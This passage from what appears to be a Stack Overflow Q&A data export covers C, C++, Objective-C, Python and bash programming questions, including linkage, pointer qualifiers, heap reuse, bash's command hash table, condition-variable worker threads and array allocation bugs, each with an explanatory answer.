CommandMap handlers;
handlers[""go""] = &amp;OnGo;
handlers[""attack""] = &amp;OnAttack;
// etc.

while(1) {
  std::string input;
  cin &gt;&gt; input;
  std::istringstream tokenizer(input);
  TokenArray tokens;
  std::string token;
  while(tokenizer &gt;&gt; token)  // Tokenize input into whitespace-separated tokens
    tokens.push_back(token);
  CommandMap::iterator handler = handlers.find(tokens[0]);
  if(handler != handlers.end())
      (*handler)(tokens);  // call the handler
  else
      ; // handle unknown command
}
</code></pre>
"
"<p>Global variables in C are by default static or extern??
If global variables are by default static then it means that we would be able to access them in a single file... But we can use global variables in different files as well.. So does this means that they have extern storage class by default...
Thanx...</p>
","9530","","<p>If you do not specify a storage class (that is, the <code>extern</code> or <code>static</code> keywords), then by default global variables have external linkage.  From the C99 standard:</p>

<blockquote>
  <p><strong>§6.2.2 Linkages of identifiers</strong></p>
  
  <p>3)    If the declaration of a file scope identifier for an object or a function contains the storage-class specifier <code>static</code>, the identifier has internal linkage.</p>
  
  <p>5)    If the declaration of an identifier for a function has no storage-class specifier, its linkage is determined exactly as if it were declared with the storage-class specifier <code>extern</code>. If the declaration of an identifier for an object has file scope and no storage-class specifier, its linkage is external.</p>
</blockquote>

<p>So even if you don't specify the <code>extern</code> keyword, globals can still be accessed by other source files (so-called <em>translation units</em>), because they can still have an <code>extern</code> declaration for the same variable.  If you use the <code>static</code> keyword to specify internal linkage, then even in the presence of an <code>extern</code> declaration for the same variable name in another source file, it will refer to a different variable.</p>
"
"<p>I've written this beauty:</p>

<pre><code>#include &lt;iostream&gt;

struct something {
    static const char ref[];
};

const char something::ref[] = """";

template&lt;int N, const char(&amp;t_ref)[N], typename to&gt; struct to_literal {
private:
    static to hidden[N];
public:
    to_literal() 
    : ref(hidden) {
        for(int i = 0; i &lt; N; i++)
            hidden[i] = t_ref[i];
    }
    const to(&amp;ref)[N];
};

template&lt;int N, const char(&amp;ref)[N], typename to&gt; const to* make_literal() {
    return to_literal&lt;N, ref, to&gt;().ref;
}

int main() {
    const wchar_t* lit = make_literal&lt;sizeof(something::ref), something::ref, wchar_t&gt;();
}
</code></pre>

<p>It somewhat cleanly converts between string literal types. But when I compile it, MSVC says that the make_literal function is an undefined external function- which is clearly untrue as it's defined right there.</p>

<p>Edit: I've managed to reduce the problem down without all of the template gunk.</p>

<pre><code>struct some {
    friend int main();
private:
    static wchar_t hidden[40];
public:
    some() 
    {    
    }
};

int main() {
    std::cout &lt;&lt; some::hidden;
    //const wchar_t* lit = make_literal&lt;sizeof(something::ref), something::ref, wchar_t&gt;();
}
main.obj : error LNK2001: unresolved external symbol ""private: static wchar_t * some::hidden"" (?hidden@some@@0PA_WA)
</code></pre>

<p>It's just a static array. Does life hate me?</p>
","9530","","<p>The issue is that is that <code>to_literal::hidden</code> is declared but never defined.  Take another look:</p>

<pre><code>struct something {
    static const char ref[];  // declaration of something::ref
};

const char something::ref[] = """";  // definition of something::ref

template&lt;int N, const char(&amp;t_ref)[N], typename to&gt; struct to_literal {
private:
    static to hidden[N];  // declaration of to_literal::hidden (but there's no
                          // definition anywhere)
public:
    to_literal() 
    : ref(hidden) {
        for(int i = 0; i &lt; N; i++)
            hidden[i] = t_ref[i];
    }
    const to(&amp;ref)[N];
};
</code></pre>

<p>To fix this, add a proper definition of <code>to_literal::hidden</code>:</p>

<pre><code>template&lt;int N, const char(&amp;t_ref)[N], typename to&gt;
to to_literal&lt;N, t_ref, to&gt;::hidden[N];  // definition of to_literal::hidden
</code></pre>
"
"<p>I am trying to determine the recommended way to set default values for NSString properties.</p>

<p>I understand it is not safe to use accessor methods in a class's init and dealloc methods. I often have string constants that I would like to assign default values. What is the recommend way to do this (considering the iVar will be released in the dealloc method)?</p>

<p>For example I understand the following is unsafe:</p>

<pre><code>@property (nonatomic, copy) NSString *identifier;
....

- (id) init
{ 
    self = [super initWithLayer:displayLayer];

    if (self != nil)
    {
        self.identifier = @""fireSpell01"";
    }

    return self;
}
</code></pre>

<p>Is it ok, or recommend to do this:</p>

<pre><code>identifier = [@""fireSpell01"" retain];
</code></pre>

<p>Or must I do this:</p>

<pre><code>identifier = [[NSString stringWithString:@""fireSpell01""] retain];
</code></pre>
","9530","","<p>Just do this:</p>

<pre><code>identifier = @""fireSpell01"";
</code></pre>

<p>There's no need to <code>retain</code> the string.  String constants exist for the lifetime of the program and never need to be retained or released.  Doing <code>[[NSString stringWithString:@""fireSpell01""] retain]</code> just creates an unnecessary copy and is pointless.</p>

<p>What you want to avoid is using the property setters in the <code>init</code> and <code>dealloc</code> methods.  Because setters could potentially have side effects that depend on certain state values, you don't want to call them on partially constructed/partially destroyed objects.  It is much better just to assign directly to the ivars and skip the setters during <code>init</code>.</p>
"
"<p>I have some C code that works great, but I do not understand one part of the code. In this part it passes a method two pointers to a two dimensional array with only one dimension specified.</p>

<p>Here it is: </p>

<pre><code>if (cmppt(pts[i*3], pts[hull*3])) 
      hull = i; 
</code></pre>

<p>the method cmppt looks like this:</p>

<pre><code>inline bool cmppt(const float* a, const float* b) { 
      if (a[0] &lt; b[0]) return true;
      if (a[0] &gt; b[0]) return false; 
      if (a[2] &lt; b[2]) return true; 
      if (a[2] &gt; b[2]) return false; 
      return false; 
} 
</code></pre>

<p>The array pts is a two-dimensional array. My question is, when the method is passed both arrays for example pts[3] and pts[0] how do I know what part of the array is it looking at? It seems that pts[0] looks at the first element of the first dimension of the array and pts[3] look at the second element of the first dimension of the array, but this doesn't make sense.</p>

<p>Thank you</p>
","9530","","<p><code>pts[i*3]</code> is equivalent to <code>&amp;pts[i*3][0]</code>, which is a pointer to the first element of the <code>i*3</code>rd row of the 2D array.  Likewise, <code>pts[hull*3]</code> is a pointer to the first element of the <code>hull*3</code>rd row of the array.</p>

<p>So, the function <code>cmppt</code> takes pointers to two rows of an array.  It doesn't know <em>which</em> rows it's looking at, it only knows that it is looking at rows.</p>
"
"<p>I am allocating 12 char string on the stack, or equivalently it is 12 bytes. </p>

<p>Dissembling with gdb (under Linux) reveals that to allocate space for string on the stack, esp is moved by -24 (down the stack).</p>

<pre><code>push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
</code></pre>

<p>Why is it moved by 24 (0x18)?</p>
","9530","","<p>Because other things besides your string are getting stored on the stack, such as other local variables or temporaries.  When you have complicated expressions, the compiler stores sometimes stores intermediate results of those expressions in memory on the stack (especially when optimization is disabled), even if they don't correspond to explicit local variables.</p>
"
"<p>This is the point from ISO :Standard Conversions:Array-to-pointer conversion: $4.4: Qualification conversions /5th point</p>

<pre><code>    A multi-level pointer to member type, or a multi-level mixed pointer and
     pointer to member type has the form:
           cv 0 P 0 to cv 1 P 1 to . . . cv n − 1 P n − 1 to cv n T
    where P i is either a pointer or pointer to member and where T is not a
    pointer type or pointer to member type.
</code></pre>

<p>Can any one Explain this.If possible give the example ..
What actually meant for that form.Can any one eloborate it ?
Similarly ..There are different form in that section(Qualification conversions)</p>
","9530","","<p>A <em>multilevel pointer</em> is a pointer to a pointer.</p>

<p>Variables can be <code>const</code> or <code>volatile</code> normally (these are called <em>cv-qualifiers</em>).  When you have a pointer, both the pointed-to data and the pointer itself can have cv-qualifiers.  When you have a multilevel pointer, there can be cv-qualifiers at any level.</p>

<p>For example:</p>

<pre><code>int i1 = 1;
const int i2 = 2;
int * p1 = &amp;i1; // p1 is a non-constant pointer to a non-constant int
int * const p2 = &amp;i1; // p2 is a constant pointer to a non-constant int
int const * p3 = &amp;i2; // p3 is a non-constant pointer to a constant int
const int * p4 = &amp;i2; // same as p3
int const * const p5 = &amp;i2; // p5 is a constant pointer to a constant int
int * * pp1 = &amp;p1; // non-const pointer to non-const pointer to non-const int
int * * const pp2 = &amp;p1; // const pointer to non-const pointer to non-const int
int * const * pp3 = &amp;p2; // non-const pointer to const pointer to non-const int
int const * * pp4 = &amp;p3; // non-const pointer to non-const pointer to const int
// etc.
</code></pre>
"
"<p>Earlier today I asked <a href=""http://stackoverflow.com/questions/4272939/inverse-heisenbug-unit-test-fails-only-when-debugger-is-attached"">this question</a>.</p>

<p>After spending some time investigating this issue, I have discovered what is going on.  I am posting this as a new question because I think it is interesting enough to track as a separate issue.  I will update that question with the answer (and a link to this one).</p>

<p><strong>Launching unit test from debugger</strong></p>

<pre><code>// Construct object
Object* pObject = new Object(...);
// Pointer value of pObject == 0x05176960

// Lots of other code
// ...

// Destroy object
delete pObject;

// Construct object again
pObject = new Object(...);
// Pointer value of pObject == 0x05560194     /* Different memory location */
</code></pre>

<p><strong>Launching unit test from command line</strong></p>

<pre><code>// Construct object
Object* pObject = new Object(...);
// Pointer value of pObject == 0x05176960

// Lots of other code
// ...

// Destroy object
delete pObject;

// Construct object again
pObject = new Object(...);
// Pointer value of pObject == 0x05176960     /* Same memory location */
</code></pre>

<p>In summary:</p>

<ul>
<li>When launching the unit test from the <strong>command line</strong>, subsequent calls to <code>new</code> to allocate an <code>Object</code> (<code>delete</code>ing the previous <code>Object</code> before allocating a new one) always return the <em>same</em> address in memory.</li>
<li>When launching the unit test from the <strong>debugger</strong>, subsequent calls to <code>new</code> to allocate an <code>Object</code> (<code>delete</code>ing the previous <code>Object</code> before allocating a new one) always return a <em>unique</em> address in memory.</li>
</ul>

<p>The problem is that because allocations of <code>Object</code> always get the same address in memory when launching through the command line, a map which I am accessing which has stored the <em>old</em> pointer can still be used and the test won't crash.  But I want my unit test to crash when the defect fix is not in place, to ensure that it doesn't silently fail and the defect doesn't come back.</p>

<p>There are 2 parts to my question:</p>

<ol>
<li><p>Why would the heap manager re-use the same part of memory when launching a unit test from the command line, but not when I launch the unit test from the debugger?</p></li>
<li><p>Is there a compiler setting I could use on my test harness, or a method I can call to prevent the heap manager from re-using a section of memory that I have deleted, to allow me to correctly write my unit test?  <sup>1</sup></p></li>
</ol>

<p><hr>
<sup>1</sup>Obviously one way of doing this is to not delete the original object, but the part of the code that allocates this is in my production code, and I doing this would result in memory leaks.</p>
","9530","","<p>Your unit test is flawed, since it's relying on undefined behavior.  You should rewrite your unit test so that it doesn't rely on undefined behavior, in which case it will always pass regardless of how the memory manager decides to allocate memory.</p>

<p>What you're doing is this:</p>

<pre><code>Object* pObject = new Object(...);
...
delete pObject;
pObject = new Object(...);
// Use dangling pointer to first object, and if it crashes, the unit test fails
// This is WRONG since a crash isn't guaranteed
</code></pre>

<p>You should instead restructure the unit test so it works like this:</p>

<pre><code>Object* pObject = new Object(...);
...
// Check to see if there are dangling references to pObject right before we
// delete it.  If there are, assert() and fail the unit test.
assert(NoDanglingReferences(pObject));
delete pObject;
// Continue on with more tests
</code></pre>
"
"<p>I am encountering a really strange problem, any help is appreciated.</p>

<p>I have a executable file compiled and cp to a specific location. The name of this executable is ""qact"" There is a newly added cout statement at the first line of the main function. But when I execute the binary file in that directory, i can not see it. After a long while I accidentally find out that if I am not in that directory, I can see the outputed string when i execute it.</p>

<p>And later I find out that it's only when I am in that directory, the executed binary file is wrong and I will not see the string.</p>

<p>when I use which on that executable, no mater what directory I am in, I always get the same result and it is the correct location.</p>

<p>Really confused..</p>
","9530","","<p>Do you have another executable file of the same name elsewhere in your <code>$PATH</code>?  If so, it's possible that bash is executing the wrong executable because it uses a hash table to avoid extra <code>$PATH</code> lookups (see <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Command-Search-and-Execution"" rel=""nofollow"">Command Search and Execution</a>).</p>

<p>For example, suppose your <code>$PATH</code> is <code>/opt/local/bin:/usr/bin</code>, and you have <code>grep</code> installed in only <code>/usr/bin</code>.  When you execute <code>grep</code>, you get the obvious result:</p>

<pre><code>$ echo $PATH
/opt/local/bin:/usr/bin
$ which grep
/usr/bin/grep
$ grep --version
grep (GNU grep) 2.5.1
</code></pre>

<p>Now suppose that you install a newer version of <code>grep</code> into <code>/opt/local/bin</code>, which is earlier in your <code>$PATH</code> than <code>/usr/bin</code>.  Because <code>which</code> always does the full <code>$PATH</code> lookup each time, but bash keeps a hash table, bash still thinks that the command <code>grep</code> maps to the one in <code>/usr/bin</code>:</p>

<pre><code>$ which grep
/opt/local/bin/grep
$ grep --version
grep (GNU grep) 2.5.1
$ /opt/local/bin/grep --version
GNU grep 2.6.3
</code></pre>

<p>You can use the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Bash-Builtins"" rel=""nofollow""><code>type</code> builtin</a> to diagnose this problem.  <code>type</code> will tell you if a command is a shell builtin, an alias, a function, a keyword, or an executable file.  If the latter, it tells you the full path to the executable:</p>

<pre><code>$ type grep
grep is hashed (/usr/bin/grep)
</code></pre>

<p>So how do you fix this?  You can use the <code>hash</code> builtin to manipulate the hash table (type <code>help hash</code> for more information).  If you just want to fix one entry (<code>grep</code> in this case), you can do <code>hash -d grep</code> to say ""delete the hash table entry for <code>grep</code>"", in which case the next time you execute <code>grep</code>, it will search the full <code>$PATH</code> as expected.  If you want to clear out the entire hash table (say, if you just installed a large amount of new software or you changed your <code>$PATH</code>), then use <code>hash -r</code> to empty it.</p>
"
"<p>I have two methods that I need to run, lets call them metA and metB.</p>

<p>When I start coding this app, I called both methods without using threads, but the app started freezing, so I decided to go with threads.</p>

<p>metA and metB are called by touch events, so they can occur any time in any order. They don't depend on each other.</p>

<p>My problem is the time it takes to either threads start running. There's a lag between the time the thread is created with </p>

<pre><code>[NSThread detachNewThreadSelector:@selector(.... bla bla
</code></pre>

<p>and the time the thread starts running. </p>

<p>I suppose this time is related to the amount of time required by iOS to create the thread itself. How can I speed this? If I pre create both threads, how do I make them just do their stuff when needed and never terminate? I mean, a kind of sleeping thread that is always alive and works when asked and sleeps after that?</p>

<p>thanks. </p>
","9530","","<p>If you want to avoid the expensive startup time of creating new threads, create both threads at startup as you suggested.  To have them only run when needed, you can have them wait on a <em>condition variable</em>.  Since you're using the <code>NSThread</code> class for threading, I'd recommend using the <a href=""http://developer.apple.com/library/ios/#documentation/cocoa/reference/NSCondition_class/Reference/Reference.html"" rel=""nofollow""><code>NSCondition</code></a> class for condition variables (an alternative would be to use the POSIX threading (pthread) <a href=""https://computing.llnl.gov/tutorials/pthreads/#ConditionVariables"" rel=""nofollow"">condition variables</a>, <code>pthread_cond_t</code>).</p>

<p>One thing you'll have to be careful of is if you get another touch event while the thread is still running.  In that case, I'd recommend using a queue to keep track of work items, and then the touch event handler can just add the work item to the queue, and the worker thread can process them as long as the queue is not empty.</p>

<p>Here's one way to do this:</p>

<pre><code>typedef struct WorkItem
{
    // information about the work item
    ...
    struct WorkItem *next;  // linked list of work items
} WorkItem;

WorkItem *workQueue = NULL;  // head of linked list of work items
WorkItem *workQueueTail = NULL;  // tail of linked list of work items
NSCondition *workCondition = NULL;  // condition variable for the queue

...

-(id) init
{
    if((self = [super init]))
    {
        // Make sure this gets initialized before the worker thread starts
        // running
        workCondition = [[NSCondition alloc] init];

        // Start the worker thread
       [NSThread detachNewThreadSelector:@selector(threadProc:)
                                         toTarget:self withObject:nil];
    }

    return self;
}

// Suppose this function gets called whenever we receive an appropriate touch
// event
-(void) onTouch
{
    // Construct a new work item.  Note that this must be allocated on the
    // heap (*not* the stack) so that it doesn't get destroyed before the
    // worker thread has a chance to work on it.
    WorkItem *workItem = (WorkItem *)malloc(sizeof(WorkItem));

    // fill out the relevant info about the work that needs to get done here
    ...
    workItem-&gt;next = NULL;

    // Lock the mutex &amp; add the work item to the tail of the queue (we
    // maintain that the following invariant is always true:
    // (workQueueTail == NULL || workQueueTail-&gt;next == NULL)
    [workCondition lock];
    if(workQueueTail != NULL)
        workQueueTail-&gt;next = workItem;
    else
        workQueue = workItem;
    workQueueTail = workItem;
    [workCondition unlock];

    // Finally, signal the condition variable to wake up the worker thread
    [workCondition signal];
}

-(void) threadProc:(id)arg
{
    // Loop &amp; wait for work to arrive.  Note that the condition variable must
    // be locked before it can be waited on.  You may also want to add
    // another variable that gets checked every iteration so this thread can
    // exit gracefully if need be.
    while(1)
    {
        [workCondition lock];
        while(workQueue == NULL)
        {
            [workCondition wait];
            // The work queue should have something in it, but there are rare
            // edge cases that can cause spurious signals.  So double-check
            // that it's not empty.
        }

        // Dequeue the work item &amp; unlock the mutex so we don't block the
        // main thread more than we have to
        WorkItem *workItem = workQueue;
        workQueue = workQueue-&gt;next;
        if(workQueue == NULL)
            workQueueTail = NULL;
        [workCondition unlock];

        // Process the work item here
        ...
        free(workItem);  // don't leak memory
    }
}
</code></pre>
"
"<p>Is there a way to add multiple items to a list in a list comprehension per iteration? For example:</p>

<pre><code>y = ['a', 'b', 'c', 'd']
x = [1,2,3]

return [x, a for a in y]
</code></pre>

<p>output: <code>[[1,2,3], 'a', [1,2,3], 'b', [1,2,3], 'c', [1,2,3], 'd']</code></p>
","9530","","<p>Here's one way:</p>

<pre><code>y = ['a', 'b', 'c', 'd']
x = [1,2,3]

return reduce(lambda a,b:a+b, [[x,a] for a in y])
</code></pre>
"
"<p>I'm having trouble accessing member functions of classes stored in an STL <code>list</code>. My code is below: </p>

<pre><code>typedef Shape* shapePtr;
list &lt;shapePtr&gt; shapeList;    

//skip alot...

    case x: 
            {
                cout &lt;&lt; ""Enter the height \n"";
                cin &gt;&gt; height;
                cout &lt;&lt; ""Enter the base \n"";
                cin &gt;&gt; base;

                //computation.
                shapeList.push_back(new Triangle);
                shapeList-&gt;setHeight(height);
                shapeList-&gt;setBase(base);
                break;
             }
</code></pre>

<p>This resulted in the following error with g++:</p>

<blockquote>
  <p>operand of ‘->’ has non-pointer type</p>
  
  <p>error: no match for ‘operator*’ in ‘*shapeList’</p>
</blockquote>

<pre><code>     case x:
            {
                cout &lt;&lt; ""Enter the height \n"";
                cin &gt;&gt; height;
                cout &lt;&lt; ""Enter the base \n"";
                cin &gt;&gt; base;

                //computation.
                shapeList.push_back(new Triangle);
                (*shapeList).setHeight(height);
                (*shapeList).setBase(base);
                break;
            }
</code></pre>

<p>Resulted in the following error:</p>

<blockquote>
  <p>error: no match for ‘operator*’ in ‘*shapeList’</p>
</blockquote>
","9530","","<p><code>shapeList</code> refers to the list as a whole.  If you want the last element of the list, use <code>shapeList.back()</code>, which returns a reference to the last element (a <code>shapePtr&amp;</code> in this case).</p>

<p>However, since it looks like you're calling methods that are specific to <code>Triangle</code> instances (which I assume is a subclass of <code>Shape</code>), so you can't interact directly with <code>shapeList.back()</code> because a <code>Shape</code> doesn't have those methods.  What you need to do is separate out the allocation of a <code>Triangle</code> instance from adding it to <code>shapeList</code>.  Allocate the <code>Triangle</code> and store it in a local variable.  You can then add it to that list, and call <code>setHeight</code> and <code>setBase</code> on it via that local variable.</p>
"
"<p>It seems to have modified the original string that I wanted to split specifying tokens.</p>

<p>how does it return back a substring if it can't copy from memory?</p>

<p>I'm also looking for an alternative that accepts a <code>const char*</code> Or doesn't modify the orignal string.</p>

<p>Or is it safe to just <code>const_cast</code> the string to remove the const property and let it be handled by <code>strtok_s(char*, const char*, char**)</code>.?</p>
","9530","","<p><code>strtok_s</code> et al <strong>do</strong> modify the strings passed in, so no, you can't pass in a <code>const_cast</code>d constant string.  What it does is if it finds a delimiter, it replaces that delimiter with a NUL terminator to separate the string into two pieces.  It then returns a pointer to the first part, which is now the desired null-terminated token.</p>
"
"<p>I'm a newbie for .Net and trying to use managed threading.
I couldn't find any problem in my code, but it triggers an exception when the Thread Ends.
Something like:
Unhandled exception at 0x5cbf80ea (msvcr90d.dll)
0xC0000005: Access violation reading location 0x000000d7.</p>

<pre><code>#include ""stdafx.h""

using namespace System;
using namespace System::Threading;

#define sz 100

//int dt[sz]; //allcating a gloal buffer
int *dt;


void workerThread (void)
{
    Console::WriteLine(""Producer Thread Started!"");
    int data = 50;
    for(int i=0; i&lt;sz; i++)
    {
        Thread::Sleep(1);
        dt[i] = i;
        Console::WriteLine(""Producer W={0}"", i);
    };
    Console::WriteLine(""Producer Thread Ending"");
}

int main(array&lt;System::String ^&gt; ^args)
{
    Console::WriteLine(""This is a test on global variable and threading"");
    //allcating a buffer
    dt = new int(sz);

    Thread ^wthrd = gcnew Thread(gcnew ThreadStart(&amp;workerThread));
    //Starting Worker Thread..
    wthrd-&gt;Start(); 
    //Waiting for Worker Thread to end.
    wthrd-&gt;Join();  
    Console::WriteLine(""Worker Thread Ended."");
    Console::ReadKey();
    return 0;
}
</code></pre>

<p>However it works fine when I allocate the buffer as a global array. This exception kicks in when I use ""new"" keyword, hence a  dynamic memory allocation.
Am I making any fundamental mistakes?
Is this something to deal with the garbage collector? or Unmanaged heap allocated by the ""new"" keyword?
I would really prefer to have this buffer in unmanaged heap. Although I am writing a managed code, many other DLLs I am using are unmanaged.</p>
","9530","","<pre><code>dt = new int(sz);
</code></pre>

<p>This is allocating a <em>single</em> integer, (<strong>not</strong> an array), and initializing it with the value of <code>sz</code> (100).  What you want is this:</p>

<pre><code>dt = new int[sz];
</code></pre>

<p>This allocates an <em>array</em> of size <code>dt</code>.  Note that in order to avoid leaking memory, you must later free it like this:</p>

<pre><code>delete [] dt;
</code></pre>
"
"<p>I am trying to write a code generator script in Python, that generates a C-source file, compiles it and runs it. However, I am having trouble calling gcc from my script.</p>

<p>A simple hello world example:</p>

<pre><code>import subprocess  

basename = ""CodeGenTest"";  
execname = basename;  
srcname = basename + "".c"";  

codeList = [];  
codeList.append(""#include &lt;stdio.h&gt;"");  
codeList.append(""int main(int argc, char *argv[])\n{"");  
codeList.append(""printf(\""Hello world.\\n\"");"");  
codeList.append(""}"");  

# Convert codelist to string.  
codeList.append("""");  
codeString = ""\n"".join(codeList);  

# Print code to output source file  
outfile=open(srcname,'w');  
outfile.write(codeString);  
outfile.close;  

print ""Compile."";  
cmd = [""gcc"", ""-O2"", srcname, ""-o"", execname];  
p = subprocess.Popen(cmd);  
p.wait();  

subprocess.call([""./""+execname]);  
</code></pre>

<p>If I run this script, I get the following error output</p>

<pre><code>Compile.
Undefined symbols:
  ""_main"", referenced from:
      start in crt1.10.6.o
ld: symbol(s) not found
collect2: ld returned 1 exit status
</code></pre>

<p>If I do the exact same thing in the python interpreter shell, it works fine. I can also compile the code without problems directly in the shell.</p>

<p>I have tried various variants, using subprocess.Popen(), subprocess.call(), with and without all possible combinations of arguments that I can think of, still the same problem.</p>

<p>Anyone has any idea what might be my problem here?</p>
","9530","","<p>Change this</p>

<pre><code>outfile.close;
</code></pre>

<p>to this:</p>

<pre><code>outfile.close()
</code></pre>

<p>You're not actually closing the file, so Python isn't flushing its buffers, so all that's in the source file is an empty file.  When gcc compiles an empty file, it complains that there's no <code>main</code> function to serve as the program's entry point.</p>

<p>I'd also suggest that you check that <code>p.returncode</code> is 0 to ensure that gcc succeeded before trying to execute the (possibly non-existant) output binary.</p>

<p>Also there's no need to end each statement with a semicolon.  You only need a semicolon if you have multiple statements per line, in which case you need them in between statements.  End-of-line servers as a statement terminator when not preceded by a backslash.</p>
"
"<p>does anybody know if there is a non-MFC version of this API?</p>

<p>CalcWindowRect()</p>

<p>thanks</p>
","9530","","<p>There's no exact one-to-one replacement function for it, but <a href=""http://msdn.microsoft.com/en-us/library/ms632667%28VS.85%29.aspx"" rel=""nofollow""><code>AdjustWindowRectEx</code></a> is pretty close.  If using the <code>CWnd::adjustOutside</code> flag to account for scroll bars, you'll need to do that adjustment yourself.</p>

<p>For example:</p>

<pre><code>// MFC version
RECT desiredClientRect = {0, 0, 640, 480};
myCwnd-&gt;CalcWindowRect(&amp;desiredClientRect,
    ignoreScrollBars ? CWnd::adjustBorder : CWnd::adjustOutside);

// Win32 version
RECT desiredClientRect = {0, 0, 640, 480};
DWORD dwStyle = GetWindowLong(myHwnd, GWL_STYLE);
AdjustWindowRectEx(&amp;desiredClientRect,
    dwStyle,
    (GetMenu(myHwnd) != NULL),           // bMenu
    GetWindowLong(myHwnd, GWL_EXSTYLE)); // dwExStyle
if(!ignoreScrollBars)
{
    if(dwStyle &amp; WS_HSCROLL)
        desiredClientRect.right += GetSystemMetrics(SM_CXHSCROLL);
    if(dwStyle &amp; WS_VSCROLL)
        desiredClientRect.bottom += GetSystemMetrics(SM_CXVSCROLL);
}
</code></pre>
"
"<p>What's the <code>&lt;iosfwd&gt;</code> header used for (mentioned in <a href=""http://stdcxx.apache.org/doc/stdlibref/iosfwd-h.html"" rel=""nofollow"">this file</a>)?</p>

<p>Why is it necessary?</p>

<p>Any example?</p>
","9530","","<p>As <a href=""http://stackoverflow.com/questions/4300696/need-entry-level-explanation-of-iosfwd-in-c/4300732#4300732"">@Marcelo Cantos</a> mentioned, it's so you can include the declaration of iostream classes and functions without including the full definitions.  In C and C++, a <em>declaration</em> is a statement that says ""here is the name of something (a function/class/etc.), but I'm not going to tell you anything more about it besides its name"".  For a function, that means the name of the function, but not the body containing the function's code.  For a class, that means the name of the class but not any of the class's member variables or methods.</p>

<p>Conversely, a <em>definition</em> is the full definition: the function body, the class members, etc.</p>

<p>Oftentimes you only need the declaration of something to use—in the case of a function, you don't need to know what the function's body looks like in order to call it (except in the case of templated or inlined functions).  Likewise, with a class, you don't need to know what members the class has if all you're doing is passing around pointers or references to instances of that class.  But as soon as you need to access a member variable or call a class method, then you do need the full definition.</p>

<p>By only including the declarations instead of the definitions, the total amount of code that the compiler has to process is much, much less, and hence compilation will proceed much more quickly.</p>

<p>To give you an idea of how much code is being processed, here's how much code is contained in my local implementation:</p>

<pre><code># The following commands create a source file that includes a single header
# file (on stdout), preprocess it with g++ -E, and then count how many lines
# are in the resulting preprocessed output
$ echo '#include &lt;iosfwd&gt;' | g++ -E -xc++ - | wc
    2598    6534   57875
$ echo '#include &lt;iostream&gt;' | g++ -E -xc++ - | wc
   25631   59613  631998
</code></pre>

<p>A file that includes <code>&lt;iosfwd&gt;</code>, the compiler has to process 2598 lines of code from various header files, whereas a file that includes <code>&lt;iostream&gt;</code> has to process a whopping 25631 lines of code.  That's before compiling the actual code you care about in your source file!</p>
"
"<p>I am trying to modify a value in an array using the C programming language and I seem to be hitting a blank wall with this seemingly easy operation. Please see code snippet below:</p>

<pre><code>while(1) {
        printf(""Current prime candidate is %i\n"",nextPrimeCandidate);
        int innerSieve;//=2;
        int currentPrimeCandidate=0;

        for (innerSieve=2;innerSieve&lt;SIEVELIMIT;innerSieve++) {
            currentPrimeCandidate = nextPrimeCandidate * innerSieve;
            //printf(""Inner Sieve  is b4 funny place %i,%i\n"",innerSieve,currentPrimeCandidate);

            //initArray[currentPrimeCandidate]=5;
            //VERY UNIQUE LINE
            myArray[currentPrimeCandidate] = 0;



            //printf(""Inner Sieve after funny place is %i,%i \n"",innerSieve,currentPrimeCandidate);

        }
        nextPrimeCandidate=getNextPrimeCandidate(myArray,++nextPrimeCandidate);
        if ((nextPrimeCandidate^2) &gt; SIEVELIMIT ) break;

    }
</code></pre>

<p>The problem is with the line highlighted with the <code>VERY UNIQUE LINE</code> comment. For some reason, when the innerSieve variable reaches 33 and gets to that line, it sets the contents of the innerSieve variable to the value of that line ( which currently is 0) and basically forces the loop into an infinite loop( the <code>SIEVELIMIT</code> variable is set at 50). It seems that there is some funny stuff going on in the registers when I checked using the Eclipse Debug facility but I am not too sure what I should be looking for.</p>

<p>If you need the whole code listing, this can be provided.( with a particular variable which is not yet initialised in the code being initialised at the precise point that the innerSieve variable hits 32)</p>

<p>Any help will be greatly appreciated.</p>
","9530","","<p>@ruslik hit on it in the comment.  The problem is this line:</p>

<pre><code>if ((nextPrimeCandidate^2) &gt; SIEVELIMIT ) break;
</code></pre>

<p>In C, the <code>^</code> operator is <strong>not</strong> the power operator, it is the <em>bitwise xor</em> operator.  You're iterating far too many times than you intend, which is resulting in an array-index-out-of-bounds error, so you're overwriting random memory and getting strange results.</p>

<p>There is no power operator in C (though there is the <a href=""http://linux.die.net/man/3/pow"" rel=""nofollow""><code>pow</code></a> function).  Since you're just squaring a number, the simplest fix is to multiply the number by itself:</p>

<pre><code>if ((nextPrimeCandidate * nextPrimeCandidate) &gt; SIEVELIMIT ) break;
</code></pre>
"
"<p>I'm trying to implement a (special kind of) doubly-linked list in C, in a pthreads environment but using only C-wrapped synchronization instructions like atomic CAS, etc. rather than pthread primitives. (The elements of the list are fixed-size chunks of memory and almost surely cannot fit <code>pthread_mutex_t</code> etc. inside them.) I don't actually need full arbitrary doubly-linked list methods, only:</p>

<ul>
<li>insertion at the end of the list</li>
<li>deletion from the beginning of the list</li>
<li>deletion at arbitrary points in the list based on a pointer to the member to be removed, which was obtained from a source other than by traversing the list.</li>
</ul>

<p>So perhaps a better way to describe this data structure would be a queue/fifo with the possibility of removing items mid-queue.</p>

<p>Is there a standard approach to synchronizing this? I'm getting stuck on possible deadlock issues, some of which are probably inherent to the algorithms involved and others of which might stem from the fact that I'm trying to work in a confined space with other constraints on what I can do.</p>

<p><strong>Edit</strong>: In particular, I'm stuck on what to do if adjacent objects are to be removed simultaneously. Presumably when removing an object, you need to obtain locks on both the previous and next objects in the list and update their next/prev pointers to point to one another. But if either neighbor is already locked, this would result in a deadlock. I've tried to work out a way that any/all of the removals taking place could walk the locked part of the list and determine the maximal sublist that's currently in the process of removal, then lock the nodes adjacent to that sublist so that the whole sublist gets removed as a whole, but my head is starting to hurt.. :-P</p>

<p><strong>Conclusion(?)</strong>: To follow up, I do have some code I want to get working, but I'm also interested in the theoretical problem. Everyone's answers have been quite helpful, and combined with details of the constraints outside what I expressed here (you <em>really</em> don't want to know where the pointer-to-element-to-be-removed came from and the synchronization involved there!) I've decided to abandon the local-lock code for now and focus on:</p>

<ul>
<li>using a larger number of smaller lists which each have individual locks.</li>
<li>minimizing the number of instructions over which locks are held and poking at memory (in a safe way) prior to acquiring a lock to reduce the possibility of page faults and cache misses while a lock is held.</li>
<li>measuring the contention under artificially-high load and evaluating whether this approach is satisfactory.</li>
</ul>

<p>Thanks again to everybody who gave answers. If my experiment doesn't go well I might come back to the approaches outlined (especially Vlad's) and try again.</p>
